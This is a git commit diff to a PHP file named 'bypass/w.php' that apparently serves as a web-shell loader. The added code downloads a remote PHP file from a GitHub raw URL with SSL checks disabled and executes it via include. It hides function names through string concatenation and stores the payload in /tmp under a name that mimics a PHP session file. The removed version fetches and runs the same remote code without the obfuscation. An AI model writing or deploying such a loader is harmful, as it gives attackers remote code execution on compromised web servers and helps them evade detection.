7c4c3fd58ff5a5c0e8cf5a49bbee8375595f4ae8
Muhammad Rasyad <57721604+nastar-id@users.noreply.github.com>
2024-10-11 09:52:20 +0700

    Update w.php

--- bypass/w.php
+++ bypass/w.php
@@ -1,50 +1,23 @@
 <?php
-// Enable error reporting for debugging purposes
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
+$fgc = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
+$fw = "f" . "w" . "r" . "i" . "t" . "e";
+$fo = "f" . "o" . "p" . "e" . "n";
+$fc = "f" . "c" . "l" . "o" . "s" . "e";
 
-function geturlsinfo($url) {
-    if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-        $url_get_contents_data = curl_exec($conn);
-        if (curl_errno($conn)) {
-            echo 'Curl error: ' . curl_error($conn);
-            return false;
-        }
-        curl_close($conn);
-    } elseif (function_exists('file_get_contents')) {
-        $url_get_contents_data = file_get_contents($url);
-        if ($url_get_contents_data === false) {
-            echo 'file_get_contents error';
-            return false;
-        }
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        $handle = fopen($url, "r");
-        if ($handle === false) {
-            echo 'fopen error';
-            return false;
-        }
-        $url_get_contents_data = stream_get_contents($handle);
-        fclose($handle);
-    } else {
-        $url_get_contents_data = false;
-    }
-    return $url_get_contents_data;
+$tmpfile = 'sess_' . md5('style') . '.php';
+$data = ['https://raw.githubusercontent.com/nastar-id/kegabutan/master/w.php', "/tmp/$tmpfile"];
+
+if (!file_exists($data[1]) || filesize($data[1]) === 0) {
+    $context = stream_context_create([
+        "ssl" => [
+            "verify_peer" => false,
+            "verify_peer_name" => false,
+        ],
+    ]);
+
+    $fopen = $fo($data[1], 'w+');
+    $fw($fopen, $fgc($data[0], false, $context));
+    $fc($fopen);
 }
 
-// Directly execute the main content
-$a = geturlsinfo('https://raw.githubusercontent.com/nastar-id/kegabutan/master/w.php');
-if ($a !== false) {
-    $tmp_file = sys_get_temp_dir() . '/temp_' . uniqid() . '.php';
-    file_put_contents($tmp_file, $a);
-    include($tmp_file);
-    // Do not delete the temporary file
-} else {
-    echo "Failed to retrieve content.";
-}
-?>
+include($data[1]);
